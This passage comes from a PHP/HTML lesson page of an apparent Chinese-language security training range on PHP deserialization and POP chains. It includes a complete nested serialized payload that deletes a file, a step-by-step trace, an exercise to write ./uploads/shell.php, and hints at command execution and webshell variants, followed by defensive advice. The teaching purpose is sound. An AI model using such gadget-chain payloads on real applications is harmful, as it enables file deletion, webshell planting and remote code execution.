    <span class="keyword">public function</span> <span class="func">delete</span>(<span class="variable">$path</span>) {
        <span class="func">unlink</span>(<span class="variable">$path</span>);  <span class="comment">// 危险操作：删除文件</span>
    }
}</code></pre>

                <div class="flow-container" style="margin-top:20px">
                    <div class="flow-box blue" style="border-color:#3498db">CacheHandler::__destruct()</div>
                    <div class="flow-arrow-down">↓ $this->cache->clean()</div>
                    <div class="flow-box orange" style="border-color:#e67e22">TemplateEngine::clean()</div>
                    <div class="flow-arrow-down">↓ $this->file->delete($this->templateDir)</div>
                    <div class="flow-box red" style="border-color:#e74c3c">FileManager::delete()</div>
                    <div class="flow-arrow-down">↓ unlink($path)</div>
                    <div class="flow-box" style="border-color:#27ae60;color:#27ae60">危险操作达成！</div>
                </div>

                <h4 style="margin-top:20px"><i class="fa fa-table"></i> 常见利用场景</h4>
                <table class="info-table">
                    <thead><tr><th>利用场景</th><th>危险函数</th><th>危害等级</th><th>说明</th></tr></thead>
                    <tbody>
                        <tr><td>命令执行</td><td><code>system()</code>、<code>exec()</code></td><td style="color:#e74c3c">🔴 严重</td><td>可执行任意系统命令</td></tr>
                        <tr><td>文件操作</td><td><code>file_put_contents()</code></td><td style="color:#e74c3c">🔴 严重</td><td>可写入/删除/读取任意文件</td></tr>
                        <tr><td>代码执行</td><td><code>eval()</code>、<code>assert()</code></td><td style="color:#e74c3c">🔴 严重</td><td>可执行任意PHP代码</td></tr>
                        <tr><td>SQL注入</td><td>数据库操作方法</td><td style="color:#e67e22">🟡 高</td><td>可执行恶意SQL语句</td></tr>
                    </tbody>
                </table>
            </div>

            <!-- POP链实战演示 -->
            <div class="vuln-demo-section">
                <h4><i class="fa fa-crosshairs"></i> 实战演示：POP链从构造到触发</h4>

                <!-- Part 1: 漏洞代码回顾 -->
                <div class="vuln-code-review">
                    <div class="vuln-code-label">POP链涉及的全部类（回顾上方示例代码）</div>
                    <pre><code><span class="ser-keyword">class</span> <span class="ser-identifier">CacheHandler</span> {          <span class="comment">// ★ 入口点：__destruct 自动触发</span>
    <span class="ser-keyword">public</span> <span class="variable">$cache</span>;

    <span class="ser-keyword">public function</span> <span class="ser-identifier" style="color:#e74c3c">__destruct</span>() {
        <span class="variable">$this</span>->cache-><span class="func">clean</span>();              <span class="comment">// → 跳转到下一个类</span>
    }
}

<span class="ser-keyword">class</span> <span class="ser-identifier">TemplateEngine</span> {         <span class="comment">// ★ 中间跳板：clean() 方法</span>
    <span class="ser-keyword">public</span> <span class="variable">$templateDir</span>;
    <span class="ser-keyword">public</span> <span class="variable">$file</span>;

    <span class="ser-keyword">public function</span> <span class="func">clean</span>() {
        <span class="variable">$this</span>->file-><span class="func">delete</span>(<span class="variable">$this</span>->templateDir);  <span class="comment">// → 跳转到危险类</span>
    }
}

<span class="ser-keyword">class</span> <span class="ser-identifier">FileManager</span> {             <span class="comment">// ★ 危险操作：执行 unlink()</span>
    <span class="ser-keyword">public function</span> <span class="func">delete</span>(<span class="variable">$path</span>) {
        <span class="func">unlink</span>(<span class="variable">$path</span>);                 <span class="comment">// 危险！删除任意文件</span>
    }
}</code></pre>
                    <p style="color:#e74c3c;font-size:13px;margin-top:8px">
                        <i class="fa fa-exclamation-triangle"></i>
                        POP链关键：<code>$this->cache</code> 和 <code>$this->file</code> 是<strong>对象类型属性</strong>，
                        攻击者通过嵌套序列化将它们替换为恶意构造的对象实例
                    </p>
                </div>

                <!-- Part 2: 攻击Payload展示 -->
                <div class="vuln-payload-display">
                    <div class="vuln-payload-label">POP链攻击 Payload 字符串（三级嵌套对象）</div>
                    <div class="vuln-payload-string" style="font-size:13px;line-height:2.4">
                        <!-- Level 1: CacheHandler (外层对象) -->
                        <span class="vuln-payload-seg seg-type-id">O:</span><span class="vuln-payload-seg seg-number">12</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val" style="background:rgba(99,102,241,0.25);font-weight:600">CacheHandler</span><span class="vuln-payload-seg seg-separator">":</span><span class="vuln-payload-seg seg-number">1</span><span class="vuln-payload-seg seg-brace">{</span>
                        <!-- Level 1 属性: cache -->
                        <span class="vuln-payload-seg seg-type-id">s:</span><span class="vuln-payload-seg seg-number">5</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val">cache</span><span class="vuln-payload-seg seg-separator">";</span>
                        <!-- Level 2: TemplateEngine (中间层对象) -->
                        <span class="vuln-payload-seg seg-type-id">O:</span><span class="vuln-payload-seg seg-number">14</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val" style="background:rgba(245,158,11,0.25);font-weight:600">TemplateEngine</span><span class="vuln-payload-seg seg-separator">":</span><span class="vuln-payload-seg seg-number">2</span><span class="vuln-payload-seg seg-brace">{</span>
                        <!-- Level 2 属性: templateDir (攻击者控制的目标路径!) -->
                        <span class="vuln-payload-seg seg-type-id">s:</span><span class="vuln-payload-seg seg-number">11</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val">templateDir</span><span class="vuln-payload-seg seg-separator">";</span><span class="vuln-payload-seg seg-type-id">s:</span><span class="vuln-payload-seg seg-number">20</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg vuln-danger-text">./uploads/target.txt</span><span class="vuln-payload-seg seg-separator">";</span>
                        <!-- Level 2 属性: file -->
                        <span class="vuln-payload-seg seg-type-id">s:</span><span class="vuln-payload-seg seg-number">4</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val">file</span><span class="vuln-payload-seg seg-separator">";</span>
                        <!-- Level 3: FileManager (内层对象 - 危险操作执行者) -->
                        <span class="vuln-payload-seg seg-type-id">O:</span><span class="vuln-payload-seg seg-number">10</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val" style="background:rgba(239,68,68,0.2);font-weight:600">FileManager</span><span class="vuln-payload-seg seg-separator">":</span><span class="vuln-payload-seg seg-number">0</span><span class="vuln-payload-seg seg-brace">{}</span>
                        <!-- 关闭所有层级的括号 -->
                        <span class="vuln-payload-seg seg-brace">}</span><span class="vuln-payload-seg seg-brace">}</span>
                    </div>
                    <div class="vuln-payload-legend">
                        <span class="legend-item"><i class="fa fa-circle" style="color:#3b82f6;font-size:10px"></i> 类型标识(O/s)</span>
                        <span class="legend-item"><i class="fa fa-circle" style="color:#f59e0b;font-size:10px"></i> 长度数字</span>
                        <span class="legend-item"><i class="fa fa-circle" style="color:#22c55e;font-size:10px"></i> 名称/属性名</span>
                        <span class="legend-item"><i class="fa fa-circle" style="color:#9ca3af;font-size:10px"></i> 分隔符</span>
                        <span class="legend-item"><i class="fa fa-circle" style="color:#ef4444;font-size:10px"></i> 攻击者控制的值</span>
                    </div>
                    <!-- 嵌套结构图解 -->
                    <div style="margin-top:14px;padding:14px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:8px;font-size:13px">
                        <div style="font-weight:600;color:#166534;margin-bottom:8px"><i class="fa fa-sitemap"></i> 对象嵌套结构解析</div>
                        <div style="font-family:'Consolas',monospace;font-size:12.5px;line-height:1.9;color:#374151">
                            <div style="padding-left:0"><span style="color:#6366f1;font-weight:700">CacheHandler</span> <span style="color:#9ca3af">(入口对象)</span></div>
                            <div style="padding-left:20px">&#9500;&#9472; <span style="color:#64748b">$cache</span> <span style="color:#9ca3af">&rarr;</span></div>
                            <div style="padding-left:40px"><span style="color:#f59e0b;font-weight:700">TemplateEngine</span> <span style="color:#9ca3af">(中间跳板)</span></div>
                            <div style="padding-left:60px">&#9500;&#9472; <span style="color:#64748b">$templateDir</span> = <span style="color:#ef4444;font-weight:600;background:rgba(239,68,68,0.1);padding:1px 4px;border-radius:3px">"./uploads/target.txt"</span> <span style="color:#ef4444;font-size:11px">&larr; 攻击者控制!</span></div>
                            <div style="padding-left:60px">&#9492;&#9472; <span style="color:#64748b">$file</span> <span style="color:#9ca3af">&rarr;</span></div>
                            <div style="padding-left:80px"><span style="color:#ef4444;font-weight:700">FileManager</span> <span style="color:#9ca3af">(危险操作执行者)</span></div>
                        </div>
                    </div>
                    <p style="color:#6b7280;font-size:13px;margin-top:10px">
                        <i class="fa fa-target"></i> 目标：利用POP链删除服务器上的 <code>./uploads/target.txt</code> 文件
                    </p>
                </div>

                <!-- Part 3: 逐步执行追踪 -->
                <div class="vuln-trace-container">

                    <!-- 步骤1: 发送Payload -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-entry">1</div>
                        <div class="vuln-step-content step-entry-step">
                            <h5>攻击者发送 POP链 Payload</h5>
                            <p>攻击者将包含三级嵌套对象的序列化字符串传入服务器的 <code>unserialize()</code> 入口：</p>
                            <div class="vuln-step-code">// 与第四章相同，任何可控输入渠道均可利用
?data=O:12:"CacheHandler":1:{s:5:"cache";O:14:"TemplateEngine":...}
// 或 POST / Cookie / 数据库读取 / Redis 等</div>
                            <p style="font-size:12px;color:#9ca3af;margin-top:5px">关键区别：Payload中不是单个对象，而是<strong>嵌套了3层对象</strong>的复杂结构</p>
                        </div>
                    </div>

                    <!-- 步骤2: 解析外层对象 -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-entry">2</div>
                        <div class="vuln-step-content step-entry-step">
                            <h5>PHP 解析外层对象 — CacheHandler</h5>
                            <p>PHP 的 <code>unserialize()</code> 从最外层开始逐级解析，首先还原 <strong>CacheHandler</strong> 对象：</p>
                            <div class="vuln-step-code">O:12:"CacheHandler":1:{ s:5:"cache"; <span style="color:#f59e0b">&rarr; 发现属性值是另一个序列化对象!</span>
&#124;  &#124;         &#124;            &#124;   &mdash; &#23646;&#24615;: $cache
&#124;  &#124;         &#124;            &mdash; &#31867;&#21517;: "CacheHandler"
&#124;  &#124;         &mdash; &#31867;&#21517;&#38271;&#24230;: 12
&#124;  &mdash; &#31867;&#22411;: Object
&mdash; &#24320;&#22987;&#36882;&#24402;&#35299;&#26512;&#23130;&#22871;&#23545;&#35937;...</div>
                            <p>PHP识别出 <code>$cache</code> 属性的值不是一个简单字符串，而是<strong>另一个完整的序列化对象</strong>，于是递归解析内层。</p>
                        </div>
                    </div>

                    <!-- 步骤3: 触发__destruct -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-middle">3</div>
                        <div class="vuln-step-content step-middle-step">
                            <h5>脚本结束 — 触发 CacheHandler::__destruct()</h5>
                            <p>当对象被销毁时，PHP 自动调用 <strong>入口魔术方法</strong>：</p>
                            <div class="vuln-step-code">// PHP 内部自动执行
$cacheHandler->__destruct();

// 执行体：
$this->cache->clean();     <span style="color:#f59e0b">&larr; $this->cache 是我们注入的 TemplateEngine 对象!</span></div>
                            <p><i class="fa fa-exclamation-circle" style="color:#f59e0b"></i> <strong>第一级跳转：</strong><code>$this->cache</code> 不再是原始的缓存对象，而是攻击者构造的 <strong>TemplateEngine</strong> 实例</p>
                        </div>
                    </div>

                    <!-- 步骤4: 跳转到TemplateEngine::clean() -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-middle">4</div>
                        <div class="vuln-step-content step-middle-step">
                            <h5>方法跳转 — 进入 TemplateEngine::clean()</h5>
                            <p>PHP 在 <strong>TemplateEngine</strong> 实例上调用 <code>clean()</code> 方法：</p>
                            <div class="vuln-step-code">// 当前执行上下文已切换到 TemplateEngine 对象
$templateEngine->clean();

// 执行体：
$this->file->delete($this->templateDir);
//               ^^^^^^^^^^^^                ^^^^^^^^^^^^^
//               FileManager对象              攻击者控制的路径!</div>
                            <p><i class="fa fa-exclamation-circle" style="color:#f59e0b"></i> <strong>第二级跳转：</strong>两个属性均被篡改——<code>$this->file</code> 指向 FileManager，<code>$this->templateDir</code> 为目标路径</p>
                        </div>
                    </div>

                    <!-- 步骤5: 跳转到FileManager::delete() -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-middle">5</div>
                        <div class="vuln-step-content step-middle-step">
                            <h5>再次跳转 — 进入 FileManager::delete($path)</h5>
                            <p>执行流继续深入，进入第三个类的方法：</p>
                            <div class="vuln-step-code">// 当前执行上下文切换到 FileManager 对象
$fileManager->delete(<span class="vuln-step-highlight">./uploads/target.txt</span>);

// 执行体：
unlink(<span class="vuln-step-highlight">$path</span>);  <span style="color:#ef4444">$path = "./uploads/target.txt" （来自上层的 templateDir）</span></div>
                            <p><i class="fa fa-exclamation-circle" style="color:#f59e0b"></i> <strong>第三级跳转：</strong>参数 <code>$path</code> 沿着链条传递过来，最终到达危险函数</p>
                        </div>
                    </div>

                    <!-- 步骤6: 执行危险操作 -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-danger">6</div>
                        <div class="vuln-step-content step-danger-step">
                            <h5>危险操作执行 — unlink() 删除目标文件</h5>
                            <p>经过三次方法跳转，最终到达危险函数调用：</p>
                            <div class="vuln-step-code"><span class="ser-keyword">unlink</span>(<span class="vuln-step-highlight">./uploads/target.txt</span>);
<span style="color:#6b7280">// &uarr; 这个路径从始至终都由攻击者在Payload中指定</span>
// &uarr; 它经历了: Payload &rarr; CacheHandler.cache &rarr; TemplateEngine.templateDir &rarr; FileManager.delete($path) &rarr; unlink($path)</div>
                            <p style="color:#ef4444;font-weight:600"><i class="fa fa-skull"></i> 服务器上的 <code>./uploads/target.txt</code> 文件被成功删除！</p>
                        </div>
                    </div>

                    <!-- 步骤7: 漏洞达成 -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-danger">7</div>
                        <div class="vuln-step-content step-danger-step">
                            <h5>POP链漏洞达成 — 多级串联利用完成</h5>
                            <p>回顾整个利用过程，攻击者通过构造<strong>三层嵌套的序列化对象</strong>，实现了跨类的调用链：</p>
                            <div class="vuln-step-code"># 利用链示意（对比单类利用）
【第四章】Logger::__destruct() &rarr; file_put_contents()           &larr; 单步，1个类
【第五章】CacheHandler::__destruct()                           &larr; 第1步：入口
         &rarr; TemplateEngine::clean()                              &larr; 第2步：中间跳板
         &rarr; FileManager::delete()                                &larr; 第3步：中间跳板
         &rarr; unlink()                                             &larr; 第4步：危险操作

# 实际影响
./uploads/target.txt  &rarr;  已被删除
# 如果换成其他危险类，可以实现：
#   - system($_GET['cmd'])      &rarr; 命令执行(RCE)
#   - file_put_contents($path, $shell)  &rarr; 写Webshell
#   - eval($this->code)         &rarr; 任意代码执行</div>
                            <p style="color:#ef4444;font-weight:600;font-size:14px">
                                <i class="fa fa-check-circle"></i> <strong>POP链利用达成！</strong>攻击者通过串联3个无害（单独看）的类，完成了任意文件删除操作
                            </p>
                        </div>
                    </div>

                </div><!-- /vuln-trace-container -->

                <!-- Part 4: 总结 -->
                <div class="example-explanation">
                    <h5><i class="fa fa-lightbulb-o"></i> POP链核心理解总结</h5>
                    <p>POP链的本质是：<strong>利用对象属性的嵌套关系，将多个类的普通方法串联成一条攻击链</strong>。每个类单独看可能并不危险，但组合起来就能产生严重危害。</p>

                    <div style="background:rgba(255,255,255,0.6);padding:14px;border-radius:8px;margin:12px 0;text-align:center;font-size:14px">
                        <strong style="color:#6366f1">构造嵌套对象Payload</strong>
                        <i class="fa fa-arrow-right" style="margin:0 10px;color:#6b7280"></i>
                        <strong style="color:#6366f1">unserialize() 还原全部对象</strong>
                        <i class="fa fa-arrow-right" style="margin:0 10px;color:#6b7280"></i>
                        <strong style="color:#6366f1">__destruct() &rarr; clean() &rarr; delete()</strong>
                        <i class="fa fa-arrow-right" style="margin:0 10px;color:#6b7280"></i>
                        <strong style="color:#ef4444">unlink() 删除目标文件</strong>
                    </div>

                    <div style="background:rgba(255,255,255,0.5);padding:12px;border-radius:8px;margin:10px 0;font-size:13px">
                        <div style="font-weight:600;margin-bottom:6px"><i class="fa fa-balance-scale" style="color:#6366f1"></i> 第四章 vs 第五章 对比</div>
                        <div style="display:flex;gap:15px;flex-wrap:wrap">
                            <div style="flex:1;min-width:200px;background:rgba(99,102,241,0.06);padding:10px;border-radius:6px;border-left:3px solid #6366f1">
                                <div style="font-weight:600;color:#4338ca;font-size:12px;margin-bottom:4px">第四章：单类利用</div>
                                <div style="font-size:12px;line-height:1.6">1个对象 &rarr; 1个魔术方法 &rarr; 1个危险函数<br>Payload结构简单，适合入门理解</div>
                            </div>
                            <div style="flex:1;min-width:200px;background:rgba(99,102,241,0.06);padding:10px;border-radius:6px;border-left:3px solid #818cf8">
                                <div style="font-weight:600;color:#4338ca;font-size:12px;margin-bottom:4px">第五章：POP链利用</div>
                                <div style="font-size:12px;line-height:1.6">3个嵌套对象 &rarr; 3级方法跳转 &rarr; 1个危险函数<br>Payload含嵌套结构，接近真实场景</div>
                            </div>
                        </div>
                    </div>

                    <p style="font-size:13px">在实际漏洞挖掘中，攻击者需要在目标代码库中寻找可用的"骨牌"（具有可利用魔术方法或回调方法的类），然后像搭积木一样将它们串联起来。这就是为什么POP链构造被称为"面向属性编程"——你操控的是<strong>对象的属性值</strong>，而不是代码逻辑本身。</p>
                </div>

            </div><!-- /vuln-demo-section -->

        </div>
    </div>

    <!-- 第六章节：POP链构造练习 -->
    <div class="collapsible-section" id="section6">
        <div class="collapsible-header" onclick="toggleSection('section6')">
            <span class="toggle-text">
                <i class="fa fa-puzzle-piece"></i> POP链构造练习
            </span>
            <div class="toggle-btn"></div>
        </div>
        <div class="collapsible-content">
            <div class="chapter-title">
                <i class="fa fa-gamepad"></i> 动手构造POP链
            </div>
            <div class="chapter-description">
                通过构造恶意序列化字符串，利用POP链在服务器上写入文件，理解POP链的利用过程。
            </div>

            <!-- 题目场景 -->
            <div class="code-display-section">
                <h4><i class="fa fa-file-code-o"></i> 题目场景 - 源代码</h4>

                <div class="class-card class-entry">
                    <h5>class FileLogger <span class="badge badge-entry">入口点</span></h5>
                    <pre><code><span style="color:#569cd6">class</span> <span style="color:#4ec9b0">FileLogger</span> {
    <span style="color:#569cd6">public</span> $writer;

    <span style="color:#569cd6">public function</span> <span style="color:#dcdcaa">__destruct</span>() {
        <span style="color:#569cd6">if</span> ($this->writer) {
            $this->writer-><span style="color:#dcdcaa">write</span>();
        }
    }
}</code></pre>
                </div>

                <div class="class-card class-middle">
                    <h5>class HtmlRenderer <span class="badge badge-middle">中间跳板</span></h5>
                    <pre><code><span style="color:#569cd6">class</span> <span style="color:#4ec9b0">HtmlRenderer</span> {
    <span style="color:#569cd6">public</span> $template;
    <span style="color:#569cd6">public</span> $engine;

    <span style="color:#569cd6">public function</span> <span style="color:#dcdcaa">write</span>() {
        <span style="color:#569cd6">if</span> ($this->engine) {
            $this->engine-><span style="color:#dcdcaa">render</span>($this->template);
        }
    }
}</code></pre>
                </div>

                <div class="class-card class-danger">
                    <h5>class TemplateExecutor <span class="badge badge-danger">危险操作</span></h5>
                    <pre><code><span style="color:#569cd6">class</span> <span style="color:#4ec9b0">TemplateExecutor</span> {
    <span style="color:#569cd6">public</span> $cacheDir;

    <span style="color:#569cd6">public function</span> <span style="color:#dcdcaa">render</span>($content) {
        <span style="color:#6a9955">// 将内容写入缓存目录（危险操作）</span>
        <span style="color:#dcdcaa">file_put_contents</span>(
            $this->cacheDir . <span style="color:#ce9178">'/cache.php'</span>,
            $content
        );
    }
}</code></pre>
                </div>

                <div class="attack-target-card">
                    <h5><i class="fa fa-crosshairs"></i> 攻击目标</h5>
                    <p style="color:#742a2a;margin-bottom:8px">通过构造恶意序列化字符串，利用POP链在服务器上写入文件：</p>
                    <p>目标路径：<code>./uploads/shell.php</code></p>
                    <p>目标内容：<code>HeaSec Test</code>（实际攻击中可替换为PHP代码）</p>
                </div>
            </div>

            <!-- 步骤1.5：引导式配置 -->
            <div class="interactive-area" style="margin-top:20px">
                <h4><i class="fa fa-compass"></i> 步骤1：分析调用链并配置属性</h4>
                <div class="guided-form">
                    <div class="guided-form-item">
                        <label>FileLogger 的 $writer 属性应该设为哪个类的实例？</label>
                        <select id="guidedQ1" class="form-control">
                            <option value="">-- 请选择 --</option>
                            <option value="HtmlRenderer">HtmlRenderer</option>
                            <option value="TemplateExecutor">TemplateExecutor</option>
                            <option value="FileManager">FileManager</option>
                        </select>
                        <div id="guidedFeedback1" class="guided-feedback"></div>
                    </div>

                    <div class="guided-form-item">
                        <label>HtmlRenderer 的 $engine 属性应该设为哪个类的实例？</label>
                        <select id="guidedQ2" class="form-control">
                            <option value="">-- 请选择 --</option>
                            <option value="FileLogger">FileLogger</option>
                            <option value="TemplateExecutor">TemplateExecutor</option>
                            <option value="FileManager">FileManager</option>
                        </select>
                        <div id="guidedFeedback2" class="guided-feedback"></div>
                    </div>

                    <div class="guided-form-item">
                        <label>TemplateExecutor 的 $cacheDir 属性应该设为什么值？</label>
                        <input type="text" id="guidedQ3" class="form-control" placeholder="输入目标路径">
                        <div id="guidedFeedback3" class="guided-feedback"></div>
                    </div>

                    <div class="guided-form-item">
                        <label>HtmlRenderer 的 $template 属性应该设为什么值？</label>
                        <input type="text" id="guidedQ4" class="form-control" placeholder="输入要写入的内容">
                        <div id="guidedFeedback4" class="guided-feedback"></div>
                    </div>

                    <button class="btn btn-primary" onclick="verifyGuidedConfig()">
                        <i class="fa fa-check"></i> 验证配置
                    </button>
                </div>
            </div>

            <!-- 步骤2-4 -->
            <div class="interactive-area" style="margin-top:20px">
                <h4><i class="fa fa-code"></i> 步骤2：构造序列化字符串</h4>
                <div class="form-group">
                    <label>序列化字符串（Payload）</label>
                    <textarea id="popPayloadInput" class="form-control" placeholder="在此输入或构造序列化字符串，或通过上方引导配置自动填充" style="height:120px"></textarea>
                </div>
                <div class="btn-group">
                    <button class="btn btn-secondary" onclick="generatePopPayload()">
                        <i class="fa fa-magic"></i> 生成Payload
                    </button>
                    <button class="btn btn-success" onclick="sendPopPayload()">
                        <i class="fa fa-paper-plane"></i> 发送Payload（步骤3）
                    </button>
                    <button class="btn btn-danger" onclick="resetPopEnvironment()">
                        <i class="fa fa-refresh"></i> 重置环境
                    </button>
                </div>

                <h5 style="color:#2d3748;font-size:14px;margin-top:20px;margin-bottom:8px">
                    <i class="fa fa-terminal"></i> 执行结果
                </h5>
                <div id="popResult" class="output-box">
                    <span style="color:#718096">等待发送Payload...</span>
                </div>
            </div>

            <!-- POP链调用过程展示 -->
            <div style="margin-top:20px">
                <h4><i class="fa fa-route"></i> 步骤4：POP链调用过程</h4>
                <div id="popChainDisplay" class="pop-chain-container">
                    <div class="pop-step">
                        <div class="pop-step-number entry">1</div>
                        <div class="pop-step-content entry-step">
                            <div class="pop-step-class">FileLogger::__destruct()</div>
                            <div class="pop-step-detail">对象销毁时调用 $this->writer->write()</div>
                        </div>
                    </div>
                    <div class="pop-arrow">↓</div>
                    <div class="pop-step">
                        <div class="pop-step-number middle">2</div>
                        <div class="pop-step-content middle-step">
                            <div class="pop-step-class">HtmlRenderer::write()</div>
                            <div class="pop-step-detail">调用 $this->engine->render($this->template)</div>
                        </div>
                    </div>
                    <div class="pop-arrow">↓</div>
                    <div class="pop-step">
                        <div class="pop-step-number danger">3</div>
                        <div class="pop-step-content danger-step">
                            <div class="pop-step-class">TemplateExecutor::render()</div>
                            <div class="pop-step-detail">执行 file_put_contents($this->cacheDir.'/cache.php', $content)</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- 第七章节：防御措施 -->
    <div class="collapsible-section" id="section7">
        <div class="collapsible-header" onclick="toggleSection('section7')">
            <span class="toggle-text">
                <i class="fa fa-shield-alt"></i> 防御措施
            </span>
            <div class="toggle-btn"></div>
        </div>
        <div class="collapsible-content">
            <div class="chapter-title">
                <i class="fa fa-lock"></i> 安全编码建议
            </div>
            <div class="chapter-description">
                了解防御反序列化漏洞的最佳实践。
            </div>

            <div class="code-display-section">
                <h4><i class="fa fa-ban"></i> 1. 避免反序列化不可信数据</h4>
                <div class="composition-explanation">
                    <p>最根本的防御方式：永远不要将用户输入直接传递给<code>unserialize()</code>。如果必须传输复杂数据结构，使用更安全的替代方案。</p>
                </div>

                <h4 style="margin-top:20px"><i class="fa fa-exchange-alt"></i> 2. 使用JSON替代</h4>
                <div class="composition-explanation">
                    <p>使用<code>json_encode()</code>/<code>json_decode()</code>替代<code>serialize()</code>/<code>unserialize()</code>。JSON反序列化只会产生基本数据类型，不会创建对象，因此不会触发魔术方法。</p>
                </div>

                <h4 style="margin-top:20px"><i class="fa fa-list-alt"></i> 3. 使用allowed_classes参数（PHP 7.0+）</h4>
                <pre class="static-code-block"><code><span class="comment">// 禁止所有类的反序列化</span>
<span class="variable">$data</span> = <span class="func">unserialize</span>(<span class="variable">$input</span>, [<span class="string">'allowed_classes'</span> => <span class="keyword">false</span>]);

<span class="comment">// 只允许特定类</span>
<span class="variable">$data</span> = <span class="func">unserialize</span>(<span class="variable">$input</span>, [<span class="string">'allowed_classes'</span> => [<span class="string">'User'</span>, <span class="string">'Product'</span>]]);</code></pre>

                <h4 style="margin-top:20px"><i class="fa fa-key"></i> 4. 实现签名验证</h4>
                <pre class="static-code-block"><code><span class="keyword">function</span> <span class="func">safeUnserialize</span>(<span class="variable">$signedData</span>, <span class="variable">$secretKey</span>) {
    <span class="keyword">if</span> (<span class="func">strlen</span>(<span class="variable">$signedData</span>) < <span class="number">64</span>) {
        <span class="keyword">throw new</span> <span class="type">Exception</span>(<span class="string">'数据格式无效'</span>);
    }
    <span class="variable">$signature</span> = <span class="func">substr</span>(<span class="variable">$signedData</span>, <span class="number">0</span>, <span class="number">64</span>);
    <span class="variable">$data</span> = <span class="func">substr</span>(<span class="variable">$signedData</span>, <span class="number">64</span>);
    <span class="variable">$expected</span> = <span class="func">hash_hmac</span>(<span class="string">'sha256'</span>, <span class="variable">$data</span>, <span class="variable">$secretKey</span>);
    <span class="keyword">if</span> (!<span class="func">hash_equals</span>(<span class="variable">$expected</span>, <span class="variable">$signature</span>)) {
        <span class="keyword">throw new</span> <span class="type">Exception</span>(<span class="string">'签名验证失败'</span>);
    }
    <span class="keyword">return</span> <span class="func">unserialize</span>(<span class="variable">$data</span>, [<span class="string">'allowed_classes'</span> => <span class="keyword">false</span>]);
}</code></pre>

                <h4 style="margin-top:20px"><i class="fa fa-table"></i> 防御方案对比</h4>
                <table class="info-table">
                    <thead><tr><th>防御方案</th><th>安全性</th><th>实现复杂度</th><th>推荐指数</th></tr></thead>
                    <tbody>
                        <tr><td>不使用unserialize()</td><td>🟢 最高</td><td>🟢 低</td><td>⭐⭐⭐⭐⭐</td></tr>
                        <tr><td>使用JSON替代</td><td>🟢 高</td><td>🟢 低</td><td>⭐⭐⭐⭐⭐</td></tr>
                        <tr><td>allowed_classes限制</td><td>🟡 中高</td><td>🟢 低</td><td>⭐⭐⭐⭐</td></tr>
                        <tr><td>签名验证</td><td>🟡 中高</td><td>🟡 中</td><td>⭐⭐⭐⭐</td></tr>
                        <tr><td>输入过滤</td><td>🟠 中</td><td>🟡 中</td><td>⭐⭐⭐</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- 第八章节：学习完成 -->
    <div class="collapsible-section" id="section8">
        <div class="collapsible-header" onclick="toggleSection('section8')">
            <span class="toggle-text">
                <i class="fa fa-graduation-cap"></i> 学习完成
            </span>
            <div class="toggle-btn"></div>
        </div>
        <div class="collapsible-content">
            <div class="chapter-title">
                <i class="fa fa-check-circle"></i> 学习总结
            </div>

            <div class="composition-explanation" style="background: linear-gradient(135deg, #f0f9ff 0%, #e6f7ff 100%); border-left-color: #4299e1;">
                <h5><i class="fa fa-star" style="color: #f59e0b;"></i> 恭喜你完成了PHP反序列化基础知识的学习！</h5>
                <p style="margin: 10px 0; color: #2d3748;">通过本靶场，你已经掌握了：</p>
                <ul>
                    <li>序列化与反序列化的基本概念和应用场景</li>
                    <li>PHP序列化格式中各数据类型的表示方法</li>
                    <li>通过交互练习动手体验序列化与反序列化的过程</li>
                    <li>PHP魔术方法在反序列化中的触发机制</li>
                    <li>反序列化漏洞的本质和利用流程</li>
                    <li>POP链的概念和构造方法</li>
                    <li>反序列化漏洞的防御措施</li>
                </ul>
            </div>

            <div class="mastery-section">
                <div class="mastery-button-container">
                    <button type="button" class="heasec-mastery-btn" id="masteryBtn" onclick="updateLearningStatus()">
                        <i class="fa fa-check-circle"></i>
                        我已掌握
                    </button>
                </div>
                <p class="mastery-description">点击"我已掌握"按钮记录你的学习进度</p>
            </div>
        </div>
    </div>
</div>

<!-- 引入星星系统组件的JavaScript -->
<script src="<?php echo $commonBasePath; ?>components/star-system/js/heasec-congrats-modal.js"></script>

<!-- 配置变量 -->
<script>
    window.heasecConfig = {
        commonBasePath: '<?php echo $commonBasePath; ?>'
    };
</script>

<!-- 引入靶场交互脚本 -->
<script src="./js/main.js?v=v1.0.0"></script>

<?php
// 引入公共底部
require_once $commonBasePath . 'includes/footer.php';
?>
